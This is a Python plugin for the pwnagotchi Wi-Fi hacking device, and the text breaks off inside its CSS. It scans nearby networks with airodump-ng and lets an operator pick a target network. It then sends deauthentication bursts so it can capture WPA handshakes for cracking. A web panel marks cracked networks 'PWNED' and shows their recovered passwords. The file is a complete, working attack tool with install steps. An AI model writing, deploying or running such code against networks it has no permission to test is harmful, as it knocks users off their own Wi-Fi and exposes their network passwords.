"""
wd_scanner.py - pwnagotchi plugin

Use a SECONDARY (auxiliary) radio - one that is NOT being used by pwnagotchi /
bettercap - to passively scan the surrounding RF, list SSIDs along with the
number of associated clients, and let the operator pick a target.

When a target is picked, the plugin:
  1. Pins pwnagotchi's MAIN radio (via bettercap) to the target's channel.
  2. Sends deauthentication frames at the target BSSID.
  3. Listens for 30 seconds. Bettercap's existing handshake dumper writes any
     captured handshakes into the configured handshakes folder
     (config.bettercap.handshakes), so they get picked up by pwnagotchi's
     normal upload / cracking pipeline automatically.
  4. Releases the channel pin so pwnagotchi resumes normal hopping.

The aux radio is independent: airodump-ng runs against it for scanning, so
we don't disturb bettercap.

Install:
  - Drop this file into your custom_plugins folder (see main.custom_plugins
    in /etc/pwnagotchi/config.toml).
  - Add to config.toml:

        main.plugins.wd_scanner.enabled = true
        main.plugins.wd_scanner.scan_seconds = 15            # default scan length
        main.plugins.wd_scanner.deauth_listen_seconds = 30   # capture window
        main.plugins.wd_scanner.deauth_bursts = 5            # deauth packets per burst

  - Restart pwnagotchi (`systemctl restart pwnagotchi`).
  - Browse to http://<pwnagotchi>:8080/plugins/wd_scanner
  - Pick the auxiliary radio from the dropdown and tap SELECT. Tap RELEASE
    when you want to free it (e.g. before unplugging the dongle).

The aux interface is chosen at runtime from the web UI - never hard-coded.
The dropdown re-enumerates every render, so if a USB radio changes name
(wlan1 -> wlan2 after a replug) it just shows up under its new name.

Dependencies (already on a stock pwnagotchi image):
  - aircrack-ng suite (airmon-ng, airodump-ng)
  - iw

When you SELECT an interface the plugin puts it into monitor mode (airmon-ng
start). RELEASE / on_unload reverts it to managed.
"""

import csv
import glob
import logging
import os
import re
import shutil
import signal
import subprocess
import threading
import time
from html import escape

import pwnagotchi.plugins as plugins


class WdScanner(plugins.Plugin):
    __author__ = "you@example.com"
    __version__ = "1.0.0"
    __license__ = "GPL3"
    __description__ = (
        "Use a second radio to scan for SSIDs/clients and selectively deauth "
        "and capture handshakes through pwnagotchi's main radio."
    )

    # ---------------------------------------------------------------- lifecycle

    def __init__(self):
        self._agent = None
        self._lock = threading.Lock()

        # Config (filled in on_loaded).
        self._scan_seconds = 15
        self._listen_seconds = 30
        self._deauth_bursts = 5

        # Runtime state - selection happens via the web UI.
        self._iface_cfg = None              # currently selected aux iface (user-picked)
        self._mon_iface = None              # actual mon iface after airmon-ng (e.g. wlan1mon)
        self._select_error = None           # last selection error to surface in UI

        self._scan_thread = None
        self._scan_running = False
        self._scan_started_at = 0
        self._last_scan_results = []        # list of dicts: ssid, bssid, channel, power, clients
        self._last_scan_error = None

        self._action_thread = None
        self._action_running = False
        self._action_log = []               # rolling log of last attack

    def on_loaded(self):
        opts = self.options or {}
        self._scan_seconds = int(opts.get("scan_seconds", 15))
        self._listen_seconds = int(opts.get("deauth_listen_seconds", 30))
        self._deauth_bursts = int(opts.get("deauth_bursts", 5))

        if shutil.which("airodump-ng") is None or shutil.which("airmon-ng") is None:
            logging.error("[wd_scanner] aircrack-ng suite not found on PATH.")
            return

        logging.info(
            "[wd_scanner] loaded; pick an aux radio from /plugins/wd_scanner/"
        )

    def on_ready(self, agent):
        self._agent = agent
        logging.info("[wd_scanner] agent ready, plugin armed.")

    def on_unload(self, ui):
        try:
            self._stop_scan()
        except Exception:
            pass
        try:
            self._restore_managed_mode()
        except Exception:
            pass
        logging.info("[wd_scanner] unloaded.")

    # --------------------------------------------------------- iface enumeration

    @staticmethod
    def _iface_name_ok(name):
        # Conservative: alphanumeric, dash, dot, underscore. No shell metacharacters.
        return bool(re.match(r"^[A-Za-z0-9._-]{1,15}$", name or ""))

    def _list_wireless_ifaces(self):
        """
        Return [{name, type, addr, busy}] for every wireless device on the
        machine, EXCLUDING the interface pwnagotchi/bettercap is using.
        type is 'managed' / 'monitor' / 'unknown'.
        """
        names = []
        try:
            for n in sorted(os.listdir("/sys/class/net")):
                if os.path.isdir("/sys/class/net/%s/wireless" % n) or \
                   os.path.exists("/sys/class/net/%s/phy80211" % n):
                    names.append(n)
        except FileNotFoundError:
            pass

        # Best-effort: also look at `iw dev` for vifs that don't always
        # show up under /sys/class/net by name.
        iw_out = self._run(["iw", "dev"], check=False, timeout=5) or ""
        for m in re.finditer(r"Interface\s+(\S+)", iw_out):
            n = m.group(1)
            if n not in names:
                names.append(n)

        # Compute the busy set: pwnagotchi's main iface, plus any phy that
        # backs it (so we don't accidentally clobber the same radio under a
        # different vif name).
        busy = set()
        main_iface = pwnagotchi_config_main_iface()
        if main_iface:
            busy.add(main_iface)
            phy = self._iface_phy(main_iface)
            if phy:
                for n in list(names):
                    if self._iface_phy(n) == phy:
                        busy.add(n)

        result = []
        for n in names:
            if n in busy:
                continue
            info = self._run(["iw", "dev", n, "info"], check=False, timeout=3) or ""
            if "type monitor" in info:
                t = "monitor"
            elif "type managed" in info:
                t = "managed"
            else:
                t = "unknown"
            addr = ""
            try:
                with open("/sys/class/net/%s/address" % n, "r") as f:
                    addr = f.read().strip()
            except OSError:
                pass
            result.append({"name": n, "type": t, "addr": addr})
        return result

    def _iface_phy(self, iface):
        """Return the phy backing `iface`, e.g. 'phy0', or None."""
        try:
            target = os.readlink("/sys/class/net/%s/phy80211" % iface)
            return os.path.basename(target)
        except OSError:
            return None

    # ---------------------------------------------------------- iface selection

    def _select_iface(self, name):
        """User picked an iface in the UI. Validate, claim, put in monitor."""
        with self._lock:
            self._select_error = None

            if self._scan_running or self._action_running:
                return False, "busy: scan or attack in progress"

            if not self._iface_name_ok(name):
                return False, "invalid interface name"

            if not os.path.isdir("/sys/class/net/%s" % name):
                return False, "%s does not exist" % name

            # Make sure it's not the pwnagotchi main radio (or a vif on its phy).
            main_iface = pwnagotchi_config_main_iface()
            if main_iface:
                if name == main_iface:
                    return False, "%s is pwnagotchi's main radio" % name
                phy = self._iface_phy(main_iface)
                if phy and self._iface_phy(name) == phy:
                    return False, "%s is on the same phy (%s) as pwnagotchi's main radio" % (name, phy)

            # If a different iface was previously selected, release it first.
            if self._mon_iface and self._mon_iface != name and self._iface_cfg != name:
                self._restore_managed_mode()

            self._iface_cfg = name
            mon = self._ensure_monitor_mode()
            if not mon:
                self._select_error = "could not enable monitor mode on %s" % name
                self._iface_cfg = None
                return False, self._select_error
            return True, "selected %s (mon=%s)" % (name, mon)

    def _release_iface(self):
        with self._lock:
            if self._scan_running or self._action_running:
                return False, "busy: scan or attack in progress"
            self._restore_managed_mode()
            self._iface_cfg = None
            self._last_scan_results = []
            self._last_scan_error = None
            return True, "released"

    # ------------------------------------------------------------- monitor mode

    def _ensure_monitor_mode(self):
        """Put the aux interface in monitor mode using airmon-ng."""
        if not self._iface_cfg:
            return None

        # If user gave us something already in monitor mode, just trust it.
        if self._is_monitor(self._iface_cfg):
            self._mon_iface = self._iface_cfg
            return self._mon_iface

        # Kill known interferers (NetworkManager, wpa_supplicant).
        self._run(["airmon-ng", "check", "kill"], check=False, timeout=10)

        out = self._run(
            ["airmon-ng", "start", self._iface_cfg], check=False, timeout=15
        ) or ""
        # airmon-ng prints either "monitor mode vif enabled on [phyN]wlan1mon"
        # or "monitor mode enabled on wlan1".
        m = re.search(r"monitor mode (?:vif )?enabled (?:on |for )\[?\w*\]?(\w+)", out)
        if m:
            self._mon_iface = m.group(1)
        else:
            # Fallbacks: some drivers just rename to <iface>mon, others keep name.
            for cand in (self._iface_cfg + "mon", self._iface_cfg):
                if self._iface_exists(cand) and self._is_monitor(cand):
                    self._mon_iface = cand
                    break

        if not self._mon_iface:
            logging.error("[wd_scanner] failed to enable monitor mode on %s", self._iface_cfg)
        return self._mon_iface

    def _restore_managed_mode(self):
        if not self._mon_iface:
            return
        self._run(["airmon-ng", "stop", self._mon_iface], check=False, timeout=15)
        self._mon_iface = None

    def _is_monitor(self, iface):
        out = self._run(["iw", "dev", iface, "info"], check=False, timeout=5) or ""
        return "type monitor" in out

    def _iface_exists(self, iface):
        return os.path.isdir("/sys/class/net/%s" % iface)

    # -------------------------------------------------------------------- scan

    def _start_scan(self, seconds=None):
        with self._lock:
            if self._scan_running:
                return False, "scan already running"
            if not self._ensure_monitor_mode():
                return False, "monitor mode unavailable on %s" % self._iface_cfg
            seconds = int(seconds or self._scan_seconds)
            self._scan_running = True
            self._scan_started_at = time.time()
            self._last_scan_error = None
            self._scan_thread = threading.Thread(
                target=self._scan_worker, args=(seconds,), daemon=True
            )
            self._scan_thread.start()
            return True, "scan started for %ds" % seconds

    def _stop_scan(self):
        self._scan_running = False

    def _scan_worker(self, seconds):
        tmpdir = "/tmp/wd_scanner"
        try:
            os.makedirs(tmpdir, exist_ok=True)
            for f in glob.glob(os.path.join(tmpdir, "scan-*")):
                try:
                    os.remove(f)
                except OSError:
                    pass

            prefix = os.path.join(tmpdir, "scan")
            cmd = [
                "airodump-ng",
                "--write-interval", "1",
                "--output-format", "csv",
                "-w", prefix,
                self._mon_iface,
            ]
            logging.info("[wd_scanner] running: %s", " ".join(cmd))
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                preexec_fn=os.setsid,
            )

            deadline = time.time() + seconds
            try:
                while time.time() < deadline and self._scan_running:
                    time.sleep(0.5)
            finally:
                try:
                    os.killpg(proc.pid, signal.SIGINT)
                    proc.wait(timeout=5)
                except Exception:
                    try:
                        os.killpg(proc.pid, signal.SIGKILL)
                    except Exception:
                        pass

            csvs = sorted(glob.glob(prefix + "-*.csv"))
            if not csvs:
                self._last_scan_error = "no CSV produced by airodump-ng"
                return
            self._last_scan_results = self._parse_airodump_csv(csvs[-1])
        except Exception as e:
            logging.exception("[wd_scanner] scan failed")
            self._last_scan_error = str(e)
        finally:
            self._scan_running = False

    @staticmethod
    def _parse_airodump_csv(path):
        """
        airodump CSVs are two sections separated by an empty line:
        first APs, then stations. Returns a list of AP dicts with
        an aggregated 'clients' count.
        """
        with open(path, "r", errors="replace") as f:
            text = f.read()

        parts = re.split(r"\r?\n\s*\r?\n", text, maxsplit=1)
        ap_block = parts[0] if parts else ""
        st_block = parts[1] if len(parts) > 1 else ""

        aps = []
        ap_reader = csv.reader(ap_block.splitlines())
        header_seen = False
        for row in ap_reader:
            if not row or len(row) < 14:
                continue
            if not header_seen:
                if row[0].strip().upper() == "BSSID":
                    header_seen = True
                continue
            bssid = row[0].strip()
            channel = row[3].strip()
            power = row[8].strip()
            essid = row[13].strip()
            if not bssid or bssid.upper() == "BSSID":
                continue
            try:
                channel_i = int(channel)
            except ValueError:
                channel_i = 0
            try:
                power_i = int(power)
            except ValueError:
                power_i = -100
            aps.append({
                "bssid": bssid,
                "channel": channel_i,
                "power": power_i,
                "ssid": essid or "<hidden>",
                "clients": 0,
            })

        # Count stations whose "BSSID" column maps to one of our APs.
        ap_index = {a["bssid"].lower(): a for a in aps}
        st_reader = csv.reader(st_block.splitlines())
        header_seen = False
        for row in st_reader:
            if not row or len(row) < 6:
                continue
            if not header_seen:
                if row[0].strip().upper() == "STATION MAC":
                    header_seen = True
                continue
            assoc_bssid = row[5].strip().lower()
            if assoc_bssid in ap_index:
                ap_index[assoc_bssid]["clients"] += 1

        # Sort strictly by RSSI (strongest first). airodump uses -1 as a
        # "no recent signal" sentinel; push those to the bottom by treating
        # them as -100 for ordering purposes.
        def _rank(a):
            p = a["power"]
            if p == -1:
                p = -100
            return -p
        aps.sort(key=_rank)
        return aps

    # ------------------------------------------------------------------ attack

    def _start_attack(self, bssid, channel, ssid):
        with self._lock:
            if self._action_running:
                return False, "an attack is already running"
            if self._agent is None:
                return False, "agent not ready yet"
            self._action_running = True
            self._action_log = []
            self._action_thread = threading.Thread(
                target=self._attack_worker,
                args=(bssid, int(channel), ssid),
                daemon=True,
            )
            self._action_thread.start()
            return True, "attack queued"

    def _log_action(self, msg):
        ts = time.strftime("%H:%M:%S")
        line = "[%s] %s" % (ts, msg)
        self._action_log.append(line)
        if len(self._action_log) > 200:
            self._action_log = self._action_log[-200:]
        logging.info("[wd_scanner] %s", msg)

    def _attack_worker(self, bssid, channel, ssid):
        agent = self._agent
        try:
            self._log_action("pinning main radio to channel %d for %s (%s)"
                             % (channel, ssid, bssid))
            try:
                agent.run("wifi.recon.channel %d" % channel)
            except Exception as e:
                self._log_action("channel pin failed: %s" % e)
                return

            # Send a few bursts of deauth, with brief gaps, to give clients
            # a chance to reconnect and emit the 4-way handshake.
            for i in range(self._deauth_bursts):
                try:
                    agent.run("wifi.deauth %s" % bssid)
                    self._log_action("deauth burst %d/%d -> %s"
                                     % (i + 1, self._deauth_bursts, bssid))
                except Exception as e:
                    self._log_action("deauth error: %s" % e)
                time.sleep(2)

            handshake_dir = self._handshake_dir()
            before = self._snapshot_handshakes(handshake_dir)
            self._log_action(
                "listening %ds for handshakes on channel %d (dir=%s)"
                % (self._listen_seconds, channel, handshake_dir)
            )
            time.sleep(self._listen_seconds)
            after = self._snapshot_handshakes(handshake_dir)
            new = sorted(set(after) - set(before))
            if new:
                for n in new:
                    self._log_action("captured handshake: %s" % n)
            else:
                self._log_action("no new handshake files appeared in %s" % handshake_dir)
        finally:
            try:
                agent.run("wifi.recon.channel clear")
                self._log_action("released channel pin")
            except Exception as e:
                self._log_action("could not clear channel pin: %s" % e)
            self._action_running = False

    def _load_cracked_index(self):
        """
        Walk the pwnagotchi handshake directory and return:
            {
                bssid_lower: password,
                "ssid::" + ssid_lower: password,   # secondary key
            }

        Pwnagotchi itself doesn't crack, but its companion plugins
        (quickdic, online_hashcrack, wpa-sec, etc.) drop the recovered key
        next to the pcap as one of:
            <essid>_<bssid>.cracked
            <essid>_<bssid>.pmkid.cracked
            <essid>_<bssid>.cracked.pcap         (sometimes just a marker)
            <essid>_<bssid>.pcap.cracked
        and there's often a shared <handshakes>/wpa-sec.cracked.potfile
        in hashcat's `BSSID:PASSWORD:ESSID:KEY` (or similar) format.
        We try to be permissive about all of these.
        """
        idx = {}
        path = self._handshake_dir()
        if not path or not os.path.isdir(path):
            return idx

        # Pattern A: per-handshake "<essid>_<bssid>[.something].cracked" sidecars.
        # Filename convention: pwnagotchi sanitises bssid into 12 hex chars (no colons).
        try:
            entries = os.listdir(path)
        except OSError:
            return idx

        for name in entries:
            full = os.path.join(path, name)
            lower = name.lower()
            if not (lower.endswith(".cracked")
                    or lower.endswith(".cracked.pcap")
                    or lower.endswith(".pcap.cracked")
                    or lower.endswith(".pmkid.cracked")):
                continue

            stem = re.sub(r"\.(pmkid\.)?cracked(\.pcap)?$", "", name, flags=re.I)
            stem = re.sub(r"\.pcap\.cracked$", "", stem, flags=re.I)
            # split on the LAST underscore to separate essid from bssid-hex
            m_split = re.match(r"^(.*)_([0-9a-fA-F]{12})$", stem)
            essid_part = m_split.group(1) if m_split else stem
            bssid_hex = m_split.group(2).lower() if m_split else None

            password = None
            try:
                with open(full, "r", errors="replace") as f:
                    raw = f.read().strip()
            except OSError:
                continue

            if raw:
                # Some sidecars are just the password on one line; others are
                # JSON-ish or hashcat lines like "bssid:password" /
                # "bssid:pmkid:essid:password".
                if "\n" in raw:
                    raw = raw.splitlines()[0].strip()
                parts = raw.split(":")
                if len(parts) >= 4:
                    password = parts[-1]
                elif len(parts) == 2:
                    password = parts[1]
                else:
                    password = raw

            if not password:
                # File existed but was empty; treat as "marker only"
                password = "<recovered>"

            if bssid_hex:
                # Re-format as colon-separated lower hex.
                pretty = ":".join(bssid_hex[i:i+2] for i in range(0, 12, 2))
                idx[pretty] = password
            if essid_part:
                idx["ssid::" + essid_part.lower()] = password

        # Pattern B: a shared potfile (one entry per line).
        for fname in ("wpa-sec.cracked.potfile", "wpa-sec.potfile",
                      "online_hashcrack.cracked", "cracked.potfile"):
            potfile = os.path.join(path, fname)
            if not os.path.isfile(potfile):
                continue
            try:
                with open(potfile, "r", errors="replace") as f:
                    for line in f:
                        line = line.strip()
                        if not line or line.startswith("#"):
                            continue
                        parts = line.split(":")
                        bssid_raw, essid, password = None, None, None
                        if len(parts) >= 4:
                            # hashcat: bssid:station:essid:password   OR
                            #         pmkid:station:essid:password
                            bssid_raw = parts[0]
                            essid = parts[2]
                            password = parts[-1]
                        elif len(parts) == 3:
                            bssid_raw, essid, password = parts
                        elif len(parts) == 2:
                            bssid_raw, password = parts
                        if bssid_raw and re.match(r"^[0-9a-fA-F]{12}$", bssid_raw):
                            pretty = ":".join(bssid_raw[i:i+2].lower()
                                              for i in range(0, 12, 2))
                            idx.setdefault(pretty, password or "<recovered>")
                        elif bssid_raw and re.match(
                                r"^[0-9a-fA-F:]{17}$", bssid_raw):
                            idx.setdefault(bssid_raw.lower(),
                                           password or "<recovered>")
                        if essid:
                            idx.setdefault("ssid::" + essid.lower(),
                                           password or "<recovered>")
            except OSError:
                continue

        return idx

    def _handshake_dir(self):
        # Pwnagotchi stores the handshake dir at config.bettercap.handshakes.
        cfg = None
        try:
            cfg = self._agent.config()  # newer pwnagotchi
        except Exception:
            cfg = getattr(self._agent, "_config", None)
        if not isinstance(cfg, dict):
            try:
                import pwnagotchi
                cfg = getattr(pwnagotchi, "config", None) or {}
            except Exception:
                cfg = {}
        path = (cfg.get("bettercap") or {}).get("handshakes") if isinstance(cfg, dict) else None
        return path or "/root/handshakes"

    @staticmethod
    def _snapshot_handshakes(path):
        if not path or not os.path.isdir(path):
            return []
        return os.listdir(path)

    # ------------------------------------------------------------------- shell

    @staticmethod
    def _run(argv, check=True, timeout=30):
        try:
            r = subprocess.run(
                argv,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                timeout=timeout,
            )
            if check and r.returncode != 0:
                logging.warning(
                    "[wd_scanner] %s returned %d: %s",
                    argv[0], r.returncode, r.stdout.decode(errors="replace"),
                )
            return r.stdout.decode(errors="replace")
        except FileNotFoundError:
            return ""
        except subprocess.TimeoutExpired:
            return ""

    # -------------------------------------------------------------------- HTTP

    def on_webhook(self, path, request):
        # Lazy import so the file is importable on a workstation for linting.
        from flask import abort, jsonify, redirect, request as flask_request

        # `request` may be passed positionally by some pwnagotchi versions,
        # otherwise fall back to the thread-local.
        req = request or flask_request

        norm = (path or "").lstrip("/")

        if req.method == "POST" and norm == "select":
            name = (req.form.get("interface") or "").strip()
            ok, msg = self._select_iface(name)
            if not ok:
                self._select_error = msg
            return redirect("/plugins/wd_scanner/")

        if req.method == "POST" and norm == "release":
            self._release_iface()
            return redirect("/plugins/wd_scanner/")

        if req.method == "POST" and norm == "scan":
            if not self._iface_cfg:
                self._select_error = "no aux radio selected"
                return redirect("/plugins/wd_scanner/")
            self._start_scan(req.form.get("seconds"))
            return redirect("/plugins/wd_scanner/")

        if req.method == "POST" and norm == "deauth":
            bssid = (req.form.get("bssid") or "").strip()
            channel = (req.form.get("channel") or "").strip()
            ssid = (req.form.get("ssid") or "").strip()
            if not re.match(r"^[0-9a-fA-F:]{17}$", bssid) or not channel.isdigit():
                return abort(400)
            self._start_attack(bssid, channel, ssid)
            return redirect("/plugins/wd_scanner/")

        if norm == "status.json":
            return jsonify({
                "scan_running": self._scan_running,
                "scan_started_at": self._scan_started_at,
                "scan_error": self._last_scan_error,
                "results": self._last_scan_results,
                "action_running": self._action_running,
                "action_log": self._action_log[-50:],
                "iface": self._iface_cfg,
                "mon_iface": self._mon_iface,
                "available": self._list_wireless_ifaces(),
                "select_error": self._select_error,
            })

        return self._render_index()

    # ---------------------------------------------------------- HTML rendering

    def _render_index(self):
        # Enumerate wireless devices fresh on every render so name changes
        # (e.g. wlan1 -> wlan2 after replug) are picked up automatically.
        available = self._list_wireless_ifaces()
        has_iface = bool(self._iface_cfg)

        # Build the picker dropdown.
        opt_lines = []
        seen_current = False
        for it in available:
            sel = " selected" if it["name"] == self._iface_cfg else ""
            if sel:
                seen_current = True
            label = "%s  [%s]" % (it["name"], it["type"])
            if it.get("addr"):
                label += "  %s" % it["addr"]
            opt_lines.append(
                "<option value='{n}'{sel}>{lbl}</option>".format(
                    n=escape(it["name"]), sel=sel, lbl=escape(label),
                )
            )
        # If the currently selected iface has vanished (e.g. unplugged) keep
        # it visible so the user knows what's set.
        if has_iface and not seen_current:
            opt_lines.insert(0, "<option value='{n}' selected>{n}  [missing]</option>".format(
                n=escape(self._iface_cfg)))
        if not opt_lines:
            opt_lines.append("<option value='' disabled selected>// no wireless devices //</option>")

        select_err_html = ""
        if self._select_error:
            select_err_html = "<div class='err'>// %s</div>" % escape(self._select_error)

        # Look up any networks pwnagotchi has already cracked, so we can
        # surface the password and mark the card as PWNED.
        cracked = self._load_cracked_index()

        # Build one card per AP. Mobile-first stacked layout.
        cards = []
        for ap in self._last_scan_results:
            ssid_safe = escape(ap["ssid"])
            ssid_js = ssid_safe.replace("'", "").replace("\\", "")
            # Signal pips: airodump power is dBm-ish, often negative.
            pwr = ap["power"]
            if pwr >= -55:
                bars, bar_cls = 4, "s4"
            elif pwr >= -70:
                bars, bar_cls = 3, "s3"
            elif pwr >= -82:
                bars, bar_cls = 2, "s2"
            else:
                bars, bar_cls = 1, "s1"
            cl = ap["clients"]
            cl_cls = "hot" if cl >= 3 else ("warm" if cl >= 1 else "cold")

            password = (
                cracked.get(ap["bssid"].lower())
                or cracked.get("ssid::" + ap["ssid"].lower())
            )
            is_pwned = password is not None
            pwned_cls = " pwned" if is_pwned else ""
            badge = ""
            if is_pwned:
                badge = "<span class='badge-pwned' title='already cracked'>&#x2713; PWNED</span>"

            password_row = ""
            if is_pwned:
                pw_safe = escape(password)
                password_row = (
                    "<div class='pw'>"
                    "<dt>PASSWORD</dt>"
                    "<dd><code class='pw-val'>{pw}</code>"
                    "<button type='button' class='copy' "
                    "data-pw='{pw_attr}' aria-label='copy password'>copy</button>"
                    "</dd>"
                    "</div>".format(
                        pw=pw_safe,
                        pw_attr=pw_safe.replace("&#x27;", "&apos;"),
                    )
                )

            hack_button_label = (
                "<span class='glyph'>&#x2713;</span> RE-CAPTURE"
                if is_pwned
                else "<span class='glyph'>&#x2620;</span> HACK / CAPTURE"
            )
            confirm_msg = (
                "// ALREADY PWNED\\nRe-capture handshake for\\n"
                if is_pwned
                else "// HACK TARGET\\n"
            )

            cards.append(
                "<article class='node{pwned_cls}'>"
                "  <header class='node-h'>"
                "    <span class='ssid'>{ssid}{badge}</span>"
                "    <span class='sig {bar_cls}' aria-label='signal'>"
                "      <i></i><i></i><i></i><i></i>"
                "    </span>"
                "  </header>"
                "  <dl class='meta'>"
                "    <div><dt>BSSID</dt><dd><code>{bssid}</code></dd></div>"
                "    <div><dt>CH</dt><dd>{ch}</dd></div>"
                "    <div><dt>PWR</dt><dd>{pwr} dBm</dd></div>"
                "    <div><dt>NODES</dt><dd class='cl {cl_cls}'>{cl}</dd></div>"
                "    {password_row}"
                "  </dl>"
                "  <form method='POST' action='/plugins/wd_scanner/deauth' class='hack-form'"
                "        onsubmit=\"return confirm('{confirm}{ssid_js}\\nDeauth + capture?');\">"
                "    <input type='hidden' name='bssid' value='{bssid}'>"
                "    <input type='hidden' name='channel' value='{ch}'>"
                "    <input type='hidden' name='ssid' value='{ssid}'>"
                "    <button type='submit' class='btn-hack' {disabled}>"
                "      {label}"
                "    </button>"
                "  </form>"
                "</article>".format(
                    ssid=ssid_safe,
                    ssid_js=ssid_js,
                    bssid=escape(ap["bssid"]),
                    ch=ap["channel"],
                    pwr=pwr,
                    cl=cl,
                    cl_cls=cl_cls,
                    bar_cls=bar_cls,
                    pwned_cls=pwned_cls,
                    badge=badge,
                    password_row=password_row,
                    confirm=confirm_msg,
                    label=hack_button_label,
                    disabled="disabled" if (self._action_running or not has_iface) else "",
                )
            )

        scan_state = "RUNNING" if self._scan_running else "IDLE"
        attack_state = "RUNNING" if self._action_running else "IDLE"
        action_log = "\n".join(escape(line) for line in self._action_log[-50:])
        empty_state = (
            "<div class='empty'>"
            "<div class='empty-glyph'>&#x2620;</div>"
            "<p>// NO NODES MAPPED</p>"
            "<small>tap SCAN to sweep the airspace</small>"
            "</div>"
        )

        body = """\
<!doctype html>
<html lang='en'>
<head>
<meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1, viewport-fit=cover'>
<meta name='theme-color' content='#0a0d10'>
<meta http-equiv='refresh' content='5'>
<title>ctOS // wd_scanner</title>
<style>
:root {{
  --bg: #07090b;
  --bg-2: #0d1115;
  --panel: #111820;
  --grid: #1a232c;
  --fg: #d8e4ec;
  --mute: #6c7c89;
  --cyan: #00e5ff;
  --cyan-d: #00b8cc;
  --orange: #ff7a00;
  --red: #ff2d55;
  --green: #2bff88;
  --warn: #ffb300;
}}
* {{ box-sizing: border-box; }}
html, body {{ margin: 0; padding: 0; }}
body {{
  background:
    radial-gradient(1200px 600px at 50% -10%, rgba(0,229,255,.07), transparent 60%),
    repeating-linear-gradient(0deg, rgba(255,255,255,.015) 0 1px, transparent 1px 3px),
    var(--bg);
  color: var(--fg);
  font-family: ui-monospace, "JetBrains Mono", "Fira Code", Menlo, Consolas, monospace;
  font-size: 14px;
  line-height: 1.4;
  min-height: 100vh;
  padding: env(safe-area-inset-top) env(safe-area-inset-right)
           env(safe-area-inset-bottom) env(safe-area-inset-left);
  overflow-x: hidden;
}}
body::before {{
  /* scanline overlay */
  content: '';
  position: fixed; inset: 0; pointer-events: none; z-index: 50;
  background: repeating-linear-gradient(180deg,
              rgba(0,0,0,.18) 0 1px, transparent 1px 3px);
  mix-blend-mode: multiply;
}}
.wrap {{ max-width: 720px; margin: 0 auto; padding: 12px; }}

/* ---- top header ---- */
.brand {{
  display: flex; align-items: center; gap: 10px;
  padding: 10px 12px; margin-bottom: 10px;
  border: 1px solid var(--grid);
  background: linear-gradient(180deg, #0e141a, #0a0e12);
  clip-path: polygon(0 0, 100% 0, 100% calc(100% - 10px), calc(100% - 10px) 100%, 0 100%);
}}
.brand .mark {{
  width: 28px; height: 28px; flex: 0 0 28px;
  display: grid; place-items: center;
  border: 1px solid var(--cyan);
  color: var(--cyan);
  font-weight: 700;
  text-shadow: 0 0 6px rgba(0,229,255,.6);
}}
.brand h1 {{
  margin: 0; font-size: 14px; letter-spacing: .25em;
  text-transform: uppercase; color: var(--fg);
}}
.brand h1 b {{ color: var(--orange); font-weight: 700; }}
.brand .sub {{
  margin-left: auto;
  font-size: 11px; color: var(--mute); letter-spacing: .2em;
}}

/* ---- status bar ---- */
.status {{
  display: grid; grid-template-columns: 1fr 1fr; gap: 8px;
  margin-bottom: 10px;
}}
.chip {{
  display: flex; flex-direction: column; gap: 2px;
  padding: 8px 10px;
  border: 1px solid var(--grid);
  background: var(--panel);
  font-size: 11px;
  letter-spacing: .15em;
  text-transform: uppercase;
}}
.chip .k {{ color: var(--mute); }}
.chip .v {{ color: var(--fg); font-weight: 600; }}
.chip.run .v {{ color: var(--green); text-shadow: 0 0 6px rgba(43,255,136,.5); }}
.chip.busy .v {{ color: var(--orange); text-shadow: 0 0 6px rgba(255,122,0,.5); }}

/* ---- scan toolbar ---- */
.toolbar {{
  position: sticky; top: 0; z-index: 5;
  display: flex; gap: 8px; align-items: stretch;
  padding: 10px; margin: 0 -12px 12px;
  background: linear-gradient(180deg, rgba(7,9,11,.95), rgba(7,9,11,.7));
  backdrop-filter: blur(6px);
  border-bottom: 1px solid var(--grid);
}}
.toolbar form {{ display: flex; gap: 8px; flex: 1; }}
.toolbar input[type=number] {{
  flex: 0 0 90px;
  background: #05080a;
  border: 1px solid var(--grid);
  color: var(--cyan);
  padding: 0 10px;
  font: inherit;
  height: 44px;
  letter-spacing: .1em;
}}
.toolbar input[type=number]:focus {{
  outline: none; border-color: var(--cyan);
  box-shadow: 0 0 0 2px rgba(0,229,255,.2);
}}
.btn {{
  appearance: none; -webkit-appearance: none;
  display: inline-flex; align-items: center; justify-content: center;
  gap: 8px;
  flex: 1;
  height: 44px;
  padding: 0 14px;
  font: inherit; font-weight: 700;
  letter-spacing: .2em; text-transform: uppercase;
  background: #06292e;
  color: var(--cyan);
  border: 1px solid var(--cyan-d);
  cursor: pointer;
  position: relative;
  clip-path: polygon(8px 0, 100% 0, 100% calc(100% - 8px), calc(100% - 8px) 100%, 0 100%, 0 8px);
  transition: background .12s, color .12s;
}}
.btn:hover {{ background: #093840; }}
.btn:active {{ transform: translateY(1px); }}
.btn[disabled] {{ opacity: .4; cursor: not-allowed; }}
.btn.alt {{ background: #2a1300; color: var(--orange); border-color: var(--orange); }}
.btn.alt:hover {{ background: #3a1c00; }}

/* ---- iface picker ---- */
.picker {{
  display: flex; gap: 8px; align-items: stretch;
  margin: 0 -12px 8px;
  padding: 10px;
  background: linear-gradient(180deg, #0a0e12, #07090b);
  border-bottom: 1px solid var(--grid);
}}
.picker form {{ display: flex; gap: 8px; flex: 1; }}
.picker select {{
  flex: 1;
  appearance: none; -webkit-appearance: none;
  background: #05080a;
  color: var(--cyan);
  border: 1px solid var(--grid);
  height: 44px;
  padding: 0 32px 0 12px;
  font: inherit;
  letter-spacing: .08em;
  background-image: linear-gradient(45deg, transparent 50%, var(--cyan) 50%),
                    linear-gradient(135deg, var(--cyan) 50%, transparent 50%);
  background-position: calc(100% - 18px) 50%, calc(100% - 12px) 50%;
  background-size: 6px 6px, 6px 6px;
  background-repeat: no-repeat;
}}
.picker select:focus {{
  outline: none; border-color: var(--cyan);
  box-shadow: 0 0 0 2px rgba(0,229,255,.2);
}}
.picker .btn {{ flex: 0 0 auto; padding: 0 14px; }}
.err {{
  margin: 0 0 10px;
  padding: 8px 10px;
  background: #1a0007;
  border: 1px solid var(--red);
  color: #ffb3c0;
  font-size: 12px; letter-spacing: .08em;
}}
.hint {{
  margin: 0 0 10px;
  padding: 8px 10px;
  background: #07171a;
  border: 1px dashed var(--cyan-d);
  color: var(--cyan);
  font-size: 12px; letter-spacing: .08em;
}}

/* ---- node grid ---- */
.grid {{ display: grid; gap: 10px; }}
.node {{
  position: relative;
